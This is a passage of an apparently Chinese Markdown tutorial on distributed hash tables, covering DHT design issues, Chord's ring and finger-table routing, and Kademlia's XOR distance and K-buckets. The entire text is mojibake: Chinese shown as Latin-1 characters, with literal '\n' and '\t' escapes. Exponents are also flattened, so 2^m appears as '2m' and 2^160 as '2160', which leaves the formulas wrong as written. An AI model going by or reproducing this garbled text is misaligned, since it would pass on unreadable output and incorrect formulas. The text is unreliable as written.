\n\t\n\tæ¯ä¸ªèŠ‚ç‚¹åªèƒ½å­˜å‚¨ï¼ˆæ•´ä¸ªç³»ç»Ÿçš„ï¼‰ä¸€å°éƒ¨åˆ†æ•°æ®ã€‚éœ€è¦æŠŠæ•°æ®ã€å‡åŒ€åˆ†æ‘Šã€‘åˆ°æ¯ä¸ªèŠ‚ç‚¹ã€‚\n- èŠ‚ç‚¹åŠ¨æ€å˜åŒ–  \n\n\tç»Ÿæ•£åˆ—è¡¨æ‰€å«çš„ã€æ¡¶æ•°ã€‘æ˜¯å›ºå®šä¸å˜æ»´ã€‚ä¸ºå•¥æï¼Ÿå› ä¸ºä¼ ç»Ÿæ•£åˆ—è¡¨åœ¨é’ˆå¯¹ key è®¡ç®—å‡ºæ•£åˆ—å€¼ä¹‹åï¼Œéœ€è¦ç”¨â€œæ•£åˆ—å€¼â€å’Œâ€œæ¡¶æ•°â€è¿›è¡ŒæŸç§è¿ç®—ï¼ˆæ¯”å¦‚ï¼šå–æ¨¡è¿ç®—ï¼‰ï¼Œä»è€Œå¾—åˆ°æ¡¶çš„ç¼–å·ã€‚å¦‚æœæ¡¶çš„æ•°é‡å‡ºç°å˜åŒ–ï¼Œå°±ä¼šå½±å“åˆ°ä¸Šè¿°â€œå–æ¨¡è¿ç®—â€çš„ç»“æœï¼Œç„¶åå¯¼è‡´æ•°æ®é”™ä¹±ã€‚\n\n- é«˜æ•ˆæŸ¥è¯¢\n\n##### 2.3 DHT éš¾ç‚¹è§£å†³\n\n- æ•£åˆ—ç®—æ³•çš„é€‰æ‹©\n\n\tDHTä¸šåŠ¡æ•°æ®çš„æ•£åˆ—å€¼ä½œä¸ºKey,ä¸šåŠ¡æ•°æ®ä¸ºValue, æ‰€ä»¥è¦é¿å…ç¢°æ’\n\n- åŒæ„çš„ nodeID å’Œ data key\n\n\tDHT å±äºåˆ†å¸ƒå¼ç³»ç»Ÿçš„ä¸€ç§ã€‚æ—¢ç„¶æ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œæ„å‘³ç€å­˜åœ¨ã€å¤šä¸ªã€‘èŠ‚ç‚¹\n\t\n\tå¾ˆå¤š DHT çš„è®¾è®¡ä¼šè®©â€œnode IDâ€é‡‡ç”¨è·Ÿâ€œdata keyâ€ã€åŒæ„ã€‘çš„æ•£åˆ—å€¼ã€‚è¿™ä¹ˆæçš„å¥½å¤„æ˜¯\n\t1ã€å½“æ•£åˆ—å€¼ç©ºé—´è¶³å¤Ÿå¤§çš„æ—¶å€™ï¼Œéšæœºç¢°æ’å¿½ç•¥ä¸è®¡ï¼Œå› æ­¤ä¹Ÿå°±ç¡®ä¿äº† node ID çš„å”¯ä¸€æ€§ 2ã€å¯ä»¥ç®€åŒ–ç³»ç»Ÿè®¾è®¡â€”â€”æ¯”å¦‚ç®€åŒ–è·¯ç”±ç®—æ³•\n\t\n- â€œæ‹“æ‰‘ç»“æ„â€çš„è®¾è®¡\n\n\tä½œä¸ºåˆ†å¸ƒå¼ç³»ç»Ÿï¼ŒDHT å¿…ç„¶è¦å®šä¹‰æŸç§æ‹“æ‰‘ç»“æ„ï¼›æœ‰äº†æ‹“æ‰‘ç»“æ„ï¼Œè‡ªç„¶å°±è¦è®¾è®¡æŸç§â€œè·¯ç”±ç®—æ³•â€ã€‚å¦‚æœæŸä¸ª DHT é‡‡ç”¨å‰é¢æ‰€è¯´çš„â€”â€”â€œnode IDâ€ä¸â€œdata keyâ€ã€åŒæ„ã€‘â€”â€”é‚£ä¹ˆå¾ˆè‡ªç„¶çš„å°±ä¼šå¼•å…¥â€œKey-based routingâ€ã€‚\n\t\n\tè¯·æ³¨æ„ï¼Œè¿™ã€ä¸æ˜¯ã€‘æŸä¸ªå…·ä½“çš„è·¯ç”±ç®—æ³•ï¼Œè€Œåªæ˜¯æŸç§ã€é£æ ¼ã€‘ã€‚é‡‡ç”¨è¿™ç§é£æ ¼æ¥è®¾è®¡è·¯ç”±æœºåˆ¶ï¼Œå¥½å¤„æ˜¯ï¼škey æœ¬èº«å·²ç»æä¾›äº†è¶³å¤Ÿå¤šçš„è·¯ç”±ä¿¡æ¯ã€‚\n\n- â€œè·¯ç”±ç®—æ³•â€çš„æƒè¡¡\n\n  ç”±äº DHT ä¸­çš„èŠ‚ç‚¹æ•°å¯èƒ½éå¸¸å¤šï¼ˆæ¯”å¦‚ï¼šå‡ åä¸‡ã€å‡ ç™¾ä¸‡ï¼‰ï¼Œè€Œä¸”è¿™äº›èŠ‚ç‚¹æ˜¯åŠ¨æ€å˜åŒ–çš„ã€‚å› æ­¤å°±ã€ä¸å¯èƒ½ã€‘è®©æ¯ä¸€ä¸ªèŠ‚ç‚¹éƒ½è®°å½•æ‰€æœ‰å…¶å®ƒèŠ‚ç‚¹çš„ä¿¡æ¯ã€‚å®é™…æƒ…å†µæ˜¯ï¼šæ¯ä¸ªèŠ‚ç‚¹é€šå¸¸åªçŸ¥é“å°‘æ•°ä¸€äº›èŠ‚ç‚¹çš„ä¿¡æ¯ã€‚\n\n  åœ¨ç¡®å®šäº†è·¯ç”±ç®—æ³•ä¹‹åï¼Œè¿˜éœ€è¦åšä¸€ä¸ªä¸¤éš¾çš„æƒè¡¡â€”â€”â€œè·¯ç”±è¡¨çš„å¤§å°â€ã€‚\n  è·¯ç”±è¡¨è¶Šå¤§ï¼Œå¯ä»¥å®ç°è¶ŠçŸ­ï¼ˆè·³æ•°è¶Šå°‘ï¼‰çš„è·¯ç”±ï¼›ç¼ºç‚¹æ˜¯ï¼šï¼ˆç”±äºèŠ‚ç‚¹åŠ¨æ€å˜åŒ–ï¼‰è·¯ç”±è¡¨çš„ç»´æŠ¤æˆæœ¬ä¹Ÿå°±è¶Šé«˜ã€‚\n  è·¯ç”±è¡¨æ•°è¶Šå°ï¼Œå…¶ç»´æŠ¤æˆæœ¬è¶Šå°ï¼›ç¼ºç‚¹æ˜¯ï¼šè·¯ç”±å°±ä¼šå˜é•¿ï¼ˆè·³æ•°å˜å¤šï¼‰ã€‚\n\n- è·ç¦»ç®—æ³•\n\n   æŸäº› DHT ç³»ç»Ÿè¿˜ä¼šå®šä¹‰ä¸€ç§â€œè·ç¦»ç®—æ³•â€ï¼Œç”¨æ¥è®¡ç®—ï¼šâ€œèŠ‚ç‚¹ä¹‹é—´çš„è·ç¦»â€ã€â€œæ•°æ®ä¹‹é—´çš„è·ç¦»â€ã€â€œèŠ‚ç‚¹ä¸æ•°æ®çš„è·ç¦»â€ã€‚\n\n   å†™åˆ°è¿™é‡Œï¼ŒæŸäº›èªæ˜çš„è¯»è€…å°±ä¼šæ˜ç™½ï¼šä¸ºå•¥å‰é¢è¦å¼ºè°ƒâ€”â€”â€œnode IDâ€ä¸â€œdata keyâ€ã€åŒæ„ã€‘ã€‚å½“è¿™ä¸¤è€…ã€åŒæ„ã€‘ï¼Œå°±å¯ä»¥ä½¿ç”¨ã€åŒä¸€ç§â€œè·ç¦»ç®—æ³•â€ã€‘ï¼›åä¹‹ï¼Œå¦‚æœè¿™ä¸¤è€…ä¸åŒæ„ï¼Œå¤šåŠè¦å¼•å…¥å‡ ç§ä¸åŒçš„â€œè·ç¦»ç®—æ³•â€ã€‚\n\n- æ•°æ®å®šä½\n\n\t+ ä¿å­˜æ•°æ®\n\t\t\n\t\tå½“æŸä¸ªèŠ‚ç‚¹å¾—åˆ°äº†æ–°åŠ å…¥çš„æ•°æ®ï¼ˆK/Vï¼‰ï¼Œå®ƒä¼šå…ˆè®¡ç®—è‡ªå·±ä¸æ–°æ•°æ®çš„ key ä¹‹é—´çš„â€œè·ç¦»â€ï¼›ç„¶åå†è®¡ç®—å®ƒæ‰€çŸ¥é“çš„å…¶å®ƒèŠ‚ç‚¹ä¸è¿™ä¸ª key çš„è·ç¦»ã€‚\n\t\t\n\t\tå¦‚æœè®¡ç®—ä¸‹æ¥ï¼Œè‡ªå·±ä¸ key çš„è·ç¦»æœ€å°ï¼Œé‚£ä¹ˆè¿™ä¸ªæ•°æ®å°±ä¿æŒåœ¨è‡ªå·±è¿™é‡Œã€‚å¦åˆ™çš„è¯ï¼ŒæŠŠè¿™ä¸ªæ•°æ®è½¬å‘ç»™è·ç¦»æœ€å°çš„èŠ‚ç‚¹ã€‚æ”¶åˆ°æ•°æ®çš„å¦ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä¹Ÿé‡‡ç”¨ä¸Šè¿°è¿‡ç¨‹è¿›è¡Œå¤„ç†ï¼ˆé€’å½’å¤„ç†ï¼‰ã€‚\n\n\t+ è·å–æ•°æ®\n\n\t   å½“æŸä¸ªèŠ‚ç‚¹æ¥æ”¶åˆ°æŸ¥è¯¢æ•°æ®çš„è¯·æ±‚ï¼ˆkeyï¼‰ï¼Œå®ƒä¼šå…ˆè®¡ç®—è‡ªå·±ä¸ key ä¹‹é—´çš„â€œè·ç¦»â€ï¼›ç„¶åå†è®¡ç®—å®ƒæ‰€çŸ¥é“çš„å…¶å®ƒèŠ‚ç‚¹ä¸è¿™ä¸ª key çš„è·ç¦»ã€‚\n\t\n\t  å¦‚æœè®¡ç®—ä¸‹æ¥ï¼Œè‡ªå·±ä¸ key çš„è·ç¦»æœ€å°ï¼Œé‚£ä¹ˆå°±åœ¨è‡ªå·±è¿™é‡Œæ‰¾æœ‰æ²¡æœ‰ key å¯¹åº”çš„ valueã€‚æœ‰çš„è¯å°±è¿”å› valueï¼Œæ²¡æœ‰çš„è¯å°±æŠ¥é”™ã€‚å¦åˆ™çš„è¯ï¼ŒæŠŠè¿™ä¸ªæ•°æ®è½¬å‘ç»™è·ç¦»æœ€å°çš„èŠ‚ç‚¹ã€‚æ”¶åˆ°æ•°æ®çš„å¦ä¸€ä¸ªèŠ‚ç‚¹ï¼Œä¹Ÿé‡‡ç”¨ä¸Šè¿°è¿‡ç¨‹è¿›è¡Œå¤„ç†ï¼ˆé€’å½’å¤„ç†ï¼‰ã€‚\n\n### 3. Chord åè®®\n\n+ æ¦‚è¿°\n\nChord è¯ç”Ÿäº2001å¹´ã€‚ç¬¬ä¸€æ‰¹ DHT åè®®éƒ½æ˜¯åœ¨é‚£å¹´æ¶Œç°çš„ï¼Œå¦å¤–å‡ ä¸ªæ˜¯ï¼šCANã€Tapestryã€Pastryã€‚\n\n\n+ æ‹“æ‰‘ç»“æ„â€”â€”ç¯å½¢\n\t\n\tå½“åˆè®¾è®¡â€œä¸€è‡´æ•£åˆ—â€ä¸»è¦æ˜¯ä¸ºäº†è§£å†³â€œèŠ‚ç‚¹åŠ¨æ€å˜åŒ–â€è¿™ä¸ªéš¾ç‚¹ï¼ˆå‰é¢æœ‰æåŠï¼‰ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªéš¾ç‚¹ï¼Œâ€œä¸€è‡´æ•£åˆ—â€æŠŠæ•£åˆ—å€¼ç©ºé—´ï¼ˆkeyspaceï¼‰æ„æˆä¸€ä¸ªã€ç¯ã€‘ã€‚å¯¹äº m æ¯”ç‰¹çš„æ•£åˆ—å€¼ï¼Œå…¶èŒƒå›´æ˜¯ [0, 2m-1]ã€‚ä½ æŠŠè¿™ä¸ªåŒºé—´å¤´å°¾ç›¸æ¥å°±å˜æˆä¸€ä¸ªç¯ï¼Œå…¶å‘¨é•¿æ˜¯ 2mã€‚ç„¶åå¯¹è¿™ä¸ªç¯è§„å®šäº†ä¸€ä¸ªç§»åŠ¨æ–¹å‘ï¼ˆæ¯”å¦‚é¡ºæ—¶é’ˆï¼‰ã€‚\n\t\n\t\n\tå‡è®¾æœ‰æŸä¸ªèŠ‚ç‚¹Aï¼Œè·ç¦»å®ƒæœ€è¿‘çš„æ˜¯èŠ‚ç‚¹Bï¼ˆä»¥é¡ºæ—¶é’ˆæ–¹å‘è¡¡é‡è·ç¦»ï¼‰ã€‚é‚£ä¹ˆç§° B æ˜¯ A çš„ã€ç»§ä»»ã€‘ï¼ˆsuccessorï¼‰ï¼ŒA æ˜¯ B çš„ã€å‰ä»»ã€‘ï¼ˆpredecessorï¼‰ã€‚\n\n\t```\n\tæ•°æ®éš¶å±äºã€è·ç¦»æœ€å°ã€‘çš„èŠ‚ç‚¹ã€‚ä»¥ m=6 çš„ç¯å½¢ç©ºé—´ä¸ºä¾‹ï¼š\n\tæ•°æ®åŒºé—´ [5,8] éš¶å±äºèŠ‚ç‚¹8\n\tæ•°æ®åŒºé—´ [9,15] éš¶å±äºèŠ‚ç‚¹15\n\t......\n\tæ•°æ®åŒºé—´ [59,4] éš¶å±äºèŠ‚ç‚¹4ï¼ˆæ³¨ï¼šâ€œ6æ¯”ç‰¹â€çš„ç¯å½¢ç©ºé—´ï¼Œ63ä¹‹åæ˜¯0ï¼‰\n\t```\n\n\n+ è·¯ç”±æœºåˆ¶\n\n\t- åŸºæœ¬è·¯ç”±ï¼ˆç®€å•éå†ï¼‰\n\n\t\tå½“æ”¶åˆ°è¯·æ±‚ï¼ˆkeyï¼‰ï¼Œå…ˆçœ‹ key æ˜¯å¦åœ¨è‡ªå·±è¿™é‡Œã€‚å¦‚æœåœ¨è‡ªå·±è¿™é‡Œï¼Œå°±ç›´æ¥è¿”å›ä¿¡æ¯ï¼›å¦åˆ™å°±æŠŠ key è½¬å‘ç»™è‡ªå·±çš„ç»§ä»»è€…ã€‚ä»¥æ­¤ç±»æ¨ã€‚\n\tã€€ã€€è¿™ç§ç©æ³•çš„æ—¶é—´å¤æ‚åº¦æ˜¯ O(N)ã€‚å¯¹äºä¸€ä¸ªèŠ‚ç‚¹æ•°å¾ˆå¤šçš„ DHT ç½‘ç»œï¼Œè¿™ç§åšæ³•æ˜¾ç„¶éå¸¸ä½æ•ˆã€‚\n\t\n\t- é«˜çº§è·¯ç”±ï¼ˆFinger Tableï¼‰\n\n\t\tâ€œFinger Tableâ€æ˜¯ä¸€ä¸ªåˆ—è¡¨ï¼Œæœ€å¤šåŒ…å« m é¡¹ï¼ˆm å°±æ˜¯æ•£åˆ—å€¼çš„æ¯”ç‰¹æ•°ï¼‰ï¼Œæ¯ä¸€é¡¹éƒ½æ˜¯èŠ‚ç‚¹ IDã€‚ æ¯ä¸€ä¸ªèŠ‚ç‚¹éƒ½æœ‰ä¸ªè·¯ç”±è¡¨\n\t\t\n\t\t\n\t\tå‡è®¾å½“å‰èŠ‚ç‚¹çš„ ID æ˜¯ nï¼Œé‚£ä¹ˆè¡¨ä¸­ç¬¬ i é¡¹çš„å€¼æ˜¯ï¼šsuccessor( (n + 2i) mod 2m ) å½“æ”¶åˆ°è¯·æ±‚ï¼ˆkeyï¼‰ï¼Œå°±åˆ°â€œFinger Tableâ€ä¸­æ‰¾åˆ°ã€æœ€å¤§çš„ä¸”ä¸è¶…è¿‡ keyã€‘çš„é‚£ä¸€é¡¹ï¼Œç„¶åæŠŠ key è½¬å‘ç»™è¿™ä¸€é¡¹å¯¹åº”çš„èŠ‚ç‚¹ã€‚æœ‰äº†â€œFinger Tableâ€ä¹‹åï¼Œæ—¶é—´å¤æ‚åº¦å¯ä»¥ä¼˜åŒ–ä¸º O(log N)ã€‚`è·³è·ƒå¼æŸ¥è¯¢`\n\t\t\n\n+ èŠ‚ç‚¹çš„åŠ å…¥\n\n\t- ä»»ä½•ä¸€ä¸ªæ–°æ¥çš„èŠ‚ç‚¹ï¼ˆå‡è®¾å« Aï¼‰ï¼Œéœ€è¦å…ˆè·Ÿ DHT ä¸­å·²æœ‰çš„ä»»ä¸€èŠ‚ç‚¹ï¼ˆå‡è®¾å« Bï¼‰å»ºç«‹è¿æ¥ã€‚\n\t- A éšæœºç”Ÿæˆä¸€ä¸ªæ•£åˆ—å€¼ä½œä¸ºè‡ªå·±çš„ IDï¼ˆå¯¹äºè¶³å¤Ÿå¤§çš„æ•£åˆ—å€¼ç©ºé—´ï¼ŒID ç›¸åŒçš„æ¦‚ç‡å¿½ç•¥ä¸è®¡ï¼‰\n\t- A é€šè¿‡è·Ÿ B è¿›è¡ŒæŸ¥è¯¢ï¼Œæ‰¾åˆ°è‡ªå·±è¿™ä¸ª ID åœ¨ç¯ä¸Šçš„æ¥å¤´äººã€‚ä¹Ÿå°±æ˜¯â€”â€”æ‰¾åˆ°è‡ªå·±è¿™ä¸ª ID å¯¹åº”çš„â€œç»§ä»»â€ï¼ˆå‡è®¾å« Cï¼‰ä¸â€œå‰ä»»â€ï¼ˆå‡è®¾å« Dï¼‰\n\t- ã€€æ¥ä¸‹æ¥ï¼ŒA éœ€è¦è·Ÿ C å’Œ D è¿›è¡Œä¸€ç³»åˆ—äº’åŠ¨ï¼Œä½¿å¾—è‡ªå·±æˆä¸º C çš„å‰ä»»ï¼Œä»¥åŠ D çš„ç»§ä»»ã€‚è¿™ä¸ªäº’åŠ¨è¿‡ç¨‹ï¼Œå¤§è‡´ç±»ä¼¼äºåœ¨åŒå‘é“¾è¡¨å½“ä¸­æ’å…¥å…ƒç´ \n\n+ èŠ‚ç‚¹çš„ã€æ­£å¸¸ã€‘é€€å‡º\n\n\t- å¦‚æœæŸä¸ªèŠ‚ç‚¹æƒ³è¦ä¸»åŠ¨ç¦»å¼€è¿™ä¸ª DHT ç½‘ç»œï¼ŒæŒ‰ç…§çº¦å®šéœ€è¦ä½œä¸€äº›å–„åçš„å¤„ç†å·¥ä½œã€‚æ¯”å¦‚è¯´ï¼Œé€šçŸ¥è‡ªå·±çš„å‰ä»»å»æ›´æ–°å…¶ç»§ä»»è€…......\nã€€ã€€è¿™äº›å–„åå¤„ç†ï¼Œå¤§è‡´ç±»ä¼¼äºåœ¨åŒå‘é“¾è¡¨ä¸­åˆ é™¤å…ƒç´ \n\n+ èŠ‚ç‚¹çš„ã€å¼‚å¸¸ã€‘é€€å‡º\n\n\t- ä½œä¸ºä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿï¼Œä»»ä½•èŠ‚ç‚¹éƒ½æœ‰å¯èƒ½æ„å¤–ä¸‹çº¿ï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œæ¥ä¸åŠè¿›è¡Œå–„åå°±æŒ‚æ‰äº†ï¼‰\n\n\t\tå‡è®¾ èŠ‚ç‚¹A çš„ç»§ä»»è€…ã€å¼‚å¸¸ã€‘ä¸‹çº¿äº†ï¼Œé‚£ä¹ˆ èŠ‚ç‚¹A å°±æŠ“çäº†ã€‚å’‹åŠæï¼Ÿä¸ºäº†ä¿é™©èµ·è§ï¼ŒChord å¼•å…¥äº†ä¸€ä¸ªâ€œç»§ä»»è€…å€™é€‰åˆ—è¡¨â€çš„æ¦‚å¿µã€‚æ¯ä¸ªèŠ‚ç‚¹éƒ½ç”¨è¿™ä¸ªåˆ—è¡¨æ¥åŒ…å«ï¼šè·ç¦»è‡ªå·±æœ€è¿‘çš„ N ä¸ªèŠ‚ç‚¹çš„ä¿¡æ¯ï¼Œé¡ºåºæ˜¯ã€ç”±è¿‘åˆ°è¿œã€‘ã€‚ä¸€æ—¦è‡ªå·±çš„ç»§ä»»è€…ä¸‹çº¿äº†ï¼Œå°±åœ¨åˆ—è¡¨ä¸­æ‰¾åˆ°ä¸€ä¸ªã€è·ç¦»æœ€è¿‘ä¸”åœ¨çº¿ã€‘çš„èŠ‚ç‚¹ï¼Œä½œä¸ºæ–°çš„ç»§ä»»è€…ã€‚ç„¶å èŠ‚ç‚¹A æ›´æ–°è¯¥åˆ—è¡¨ï¼Œç¡®ä¿ä¾ç„¶æœ‰ N ä¸ªå€™é€‰ã€‚æ›´æ–°å®Œâ€œç»§ä»»è€…å€™é€‰åˆ—è¡¨â€åï¼ŒèŠ‚ç‚¹A ä¹Ÿä¼šé€šçŸ¥è‡ªå·±çš„å‰ä»»ï¼Œé‚£ä¹ˆ A çš„å‰ä»»ä¹Ÿå°±èƒ½æ›´æ–°è‡ªå·±çš„â€œç»§ä»»è€…å€™é€‰åˆ—è¡¨â€ã€‚\n\t\t\n\t\t\n### 4. Kademliaï¼ˆKadï¼‰åè®®\n\n\n+ æ‹“æ‰‘ç»“æ„â€”â€”äºŒå‰æ ‘\n\n\t- æ•£åˆ—å€¼çš„é¢„å¤„ç†\n\n\t\tKad ä¹Ÿé‡‡ç”¨äº†â€œnode ID ä¸ data key åŒæ„â€çš„è®¾è®¡æ€è·¯ã€‚ç„¶å Kad é‡‡ç”¨æŸç§ç®—æ³•æŠŠ key æ˜ å°„åˆ°ä¸€ä¸ªäºŒå‰æ ‘ï¼Œæ¯ä¸€ä¸ª key éƒ½æ˜¯è¿™ä¸ªäºŒå‰æ ‘çš„ã€å¶å­ã€‘ã€‚åœ¨æ˜ å°„ä¹‹å‰ï¼Œå…ˆåšä¸€ä¸‹é¢„å¤„ç†ã€‚\n\t\t1. å…ˆæŠŠ key ä»¥äºŒè¿›åˆ¶å½¢å¼è¡¨ç¤ºã€‚\n\t\t2. æŠŠæ¯ä¸€ä¸ª key ç¼©çŸ­ä¸ºå®ƒçš„ã€æœ€çŸ­å”¯ä¸€å‰ç¼€ã€‘ã€‚\n\n\t\n\t- æ•£åˆ—å€¼çš„æ˜ å°„\n\n\t\tå®Œæˆä¸Šè¿°çš„é¢„å¤„ç†åï¼Œæ¥ä¸‹æ¥çš„æ˜ å°„è§„åˆ™æ˜¯ï¼š\n\t\n\t\t1. å…ˆæŠŠ key ä»¥äºŒè¿›åˆ¶å½¢å¼è¡¨ç¤ºï¼Œç„¶åä»é«˜ä½åˆ°ä½ä½ä¾æ¬¡å¤„ç†ã€‚\n\t\t2. äºŒè¿›åˆ¶çš„ç¬¬ n ä¸ªæ•°ä½å°±å¯¹åº”äº†äºŒå‰æ ‘çš„ç¬¬ n å±‚\n\t\t3. å¦‚æœè¯¥ä½æ˜¯1ï¼Œè¿›å…¥å·¦å­æ ‘ï¼Œæ˜¯0åˆ™è¿›å…¥å³å­æ ‘ï¼ˆè¿™åªæ˜¯äººä¸ºçº¦å®šï¼Œåè¿‡æ¥å¤„ç†ä¹Ÿå¯ä»¥ï¼‰\n\t\t4. å…¨éƒ¨æ•°ä½éƒ½å¤„ç†å®Œåï¼Œè¿™ä¸ª key å°±å¯¹åº”äº†äºŒå‰æ ‘ä¸Šçš„æŸä¸ªã€å¶å­ã€‘\n\n+ è·ç¦»ç®—æ³•â€”â€”å¼‚æˆ–ï¼ˆXORï¼‰\n\n\tæ¥ä¸‹æ¥è¦èŠçš„æ˜¯ Kad æœ€ç²¾å¦™ä¹‹å¤„â€”â€”é‡‡ç”¨ XORï¼ˆæŒ‰æ¯”ç‰¹å¼‚æˆ–æ“ä½œï¼‰ç®—æ³•è®¡ç®— key ä¹‹é—´çš„â€œè·ç¦»â€ã€‚è¿™ç§ææ³•ä½¿å¾—å®ƒå…·å¤‡äº†ç±»ä¼¼äºâ€œå‡ ä½•è·ç¦»â€çš„æŸäº›ç‰¹æ€§ï¼ˆä¸‹é¢ç”¨ âŠ• è¡¨ç¤º XORï¼‰\n\t\n\t```\n\t(A âŠ• B) == (B âŠ• A)\tXOR ç¬¦åˆâ€œäº¤æ¢å¾‹â€ï¼Œå…·å¤‡å¯¹ç§°æ€§ã€‚ç›¸æ¯”ä¹‹ä¸‹ï¼ŒChord çš„è·ç¦»ç®—æ³•ä¸å¯¹ç§°\n\t(A âŠ• A) == 0\tåèº«æ€§ï¼Œè‡ªèº«è·ç¦»ä¸ºé›¶\n\t(A âŠ• B) > 0\tã€ä¸åŒã€‘çš„ä¸¤ä¸ª key ä¹‹é—´çš„è·ç¦»å¿…å¤§äºé›¶\n\t(A âŠ• B) + (B âŠ• C) >= (A âŠ• C)\tä¸‰è§’ä¸ç­‰å¼\n\t```\n\t\n+ è·¯ç”±æœºåˆ¶\n\n\t+ äºŒå‰æ ‘çš„æ‹†åˆ†\n\n\tå¯¹æ¯ä¸€ä¸ªèŠ‚ç‚¹ï¼Œéƒ½å¯ä»¥ã€æŒ‰ç…§è‡ªå·±çš„è§†è§’ã€‘å¯¹æ•´ä¸ªäºŒå‰æ ‘è¿›è¡Œæ‹†åˆ†ã€‚\n\t\n\tæ‹†åˆ†çš„è§„åˆ™æ˜¯ï¼šå…ˆä»æ ¹èŠ‚ç‚¹å¼€å§‹ï¼ŒæŠŠã€ä¸åŒ…å«ã€‘è‡ªå·±çš„é‚£ä¸ªå­æ ‘æ‹†åˆ†å‡ºæ¥ï¼›ç„¶ååœ¨å‰©ä¸‹çš„å­æ ‘å†æ‹†åˆ†ä¸åŒ…å«è‡ªå·±çš„ä¸‹ä¸€å±‚å­æ ‘ï¼›ä»¥æ­¤ç±»æ¨ï¼Œç›´åˆ°æœ€ååªå‰©ä¸‹è‡ªå·±ã€‚\n\t\n\tKad é»˜è®¤çš„æ•£åˆ—å€¼ç©ºé—´æ˜¯ m=160ï¼ˆæ•£åˆ—å€¼æœ‰ 160 æ¯”ç‰¹ï¼‰ï¼Œå› æ­¤æ‹†åˆ†å‡ºæ¥çš„å­æ ‘ã€æœ€å¤šã€‘æœ‰ 160 ä¸ªï¼ˆè€ƒè™‘åˆ°å®é™…çš„èŠ‚ç‚¹æ•°ã€è¿œè¿œå°äºã€‘2160ï¼Œå­æ ‘çš„ä¸ªæ•°ä¼šæ˜æ˜¾å°äº 160ï¼‰ã€‚\n\t\n\tå¯¹äºæ¯ä¸€ä¸ªèŠ‚ç‚¹è€Œè¨€ï¼Œå½“å®ƒä»¥è‡ªå·±çš„è§†è§’å®Œæˆå­æ ‘æ‹†åˆ†åï¼Œä¼šå¾—åˆ° n ä¸ªå­æ ‘ï¼›å¯¹äºæ¯ä¸ªå­æ ‘ï¼Œå¦‚æœå®ƒéƒ½èƒ½çŸ¥é“é‡Œé¢çš„ä¸€ä¸ªèŠ‚ç‚¹ï¼Œé‚£ä¹ˆå®ƒå°±å¯ä»¥åˆ©ç”¨è¿™ n ä¸ªèŠ‚ç‚¹è¿›è¡Œé€’å½’è·¯ç”±ï¼Œä»è€Œåˆ°è¾¾æ•´ä¸ªäºŒå‰æ ‘çš„ã€ä»»ä½•ä¸€ä¸ªã€‘èŠ‚ç‚¹\n\t\n+ K-æ¡¶ï¼ˆK-bucketï¼‰ \n\n\tæ¯ä¸ªèŠ‚ç‚¹åœ¨å®Œæˆå­æ ‘æ‹†åˆ†åï¼Œåªéœ€è¦çŸ¥é“æ¯ä¸ªå­æ ‘é‡Œé¢çš„ä¸€ä¸ªèŠ‚ç‚¹ï¼Œå°±è¶³ä»¥å®ç°å…¨éå†ã€‚ä½†æ˜¯è€ƒè™‘åˆ°å¥å£®æ€§ï¼ˆè¯·å§‹ç»ˆç‰¢è®°ï¼šåˆ†å¸ƒå¼ç³»ç»Ÿçš„èŠ‚ç‚¹æ˜¯åŠ¨æ€å˜åŒ–æ»´ï¼‰ï¼Œå…‰çŸ¥é“ã€ä¸€ä¸ªã€‘æ˜¾ç„¶æ˜¯ä¸å¤Ÿæ»´ï¼Œéœ€è¦çŸ¥é“ã€å¤šä¸ªã€‘æ‰æ¯”è¾ƒä¿é™©ã€‚\n\t\n\tæ‰€ä»¥ Kad è®ºæ–‡ä¸­ç»™å‡ºäº†ä¸€ä¸ªâ€œK-æ¡¶ï¼ˆK-bucketï¼‰â€çš„æ¦‚å¿µã€‚ä¹Ÿå°±æ˜¯è¯´ï¼šæ¯ä¸ªèŠ‚ç‚¹åœ¨å®Œæˆå­æ ‘æ‹†åˆ†åï¼Œè¦è®°å½•æ¯ä¸ªå­æ ‘é‡Œé¢çš„ K ä¸ªèŠ‚ç‚¹ã€‚è¿™é‡Œæ‰€è¯´çš„ K å€¼æ˜¯ä¸€ä¸ªã€ç³»ç»Ÿçº§ã€‘çš„å¸¸é‡ã€‚ç”±ä½¿ç”¨ Kad çš„è½¯ä»¶ç³»ç»Ÿè‡ªå·±è®¾å®šï¼ˆæ¯”å¦‚ BT ä¸‹è½½ä½¿ç”¨çš„ Kad ç½‘ç»œï¼ŒK è®¾å®šä¸º 8ï¼‰ã€‚\n\t\n\tK æ¡¶å…¶å®å°±æ˜¯ã€è·¯ç”±è¡¨ã€‘ã€‚å¯¹äºæŸä¸ªèŠ‚ç‚¹è€Œè¨€ï¼Œå¦‚æœã€ä»¥å®ƒè‡ªå·±ä¸ºè§†è§’ã€‘æ‹†åˆ†äº† n ä¸ªå­æ ‘ï¼Œé‚£ä¹ˆå®ƒå°±éœ€è¦ç»´æŠ¤ n ä¸ªè·¯ç”±è¡¨ï¼Œå¹¶ä¸”æ¯ä¸ªè·¯ç”±è¡¨çš„ã€ä¸Šé™ã€‘æ˜¯ Kã€‚è¯´ K åªæ˜¯ä¸€ä¸ªã€ä¸Šé™ã€‘ï¼Œæ˜¯å› ä¸ºæœ‰ä¸¤ç§æƒ…å†µä½¿å¾— K æ¡¶çš„å°ºå¯¸ä¼šå°äº Kã€‚\n\t1. è·ç¦»è¶Šè¿‘çš„å­æ ‘å°±è¶Šå°ã€‚å¦‚æœæ•´ä¸ªå­æ ‘ã€å¯èƒ½å­˜åœ¨çš„ã€‘èŠ‚ç‚¹æ•°å°äº Kï¼Œé‚£ä¹ˆè¯¥å­æ ‘çš„ K æ¡¶å°ºå¯¸æ°¸è¿œä¹Ÿä¸å¯èƒ½è¾¾åˆ° Kã€‚\n\t2. æœ‰äº›å­æ ‘è™½ç„¶å®é™…ä¸Šçº¿çš„èŠ‚ç‚¹æ•°è¶…è¿‡ Kï¼Œä½†æ˜¯å› ä¸ºç§ç§åŸå› ï¼Œæ²¡æœ‰æ”¶é›†åˆ°è¯¥å­æ ‘è¶³å¤Ÿå¤šçš„èŠ‚ç‚¹ï¼Œè¿™ä¹Ÿä¼šä½¿å¾—è¯¥å­æ ‘çš„ K æ¡¶å°ºå¯¸å°äº Kã€‚\n\t\n+ K-æ¡¶ï¼ˆK-bucketï¼‰çš„åˆ·æ–°æœºåˆ¶\n\n\t+ 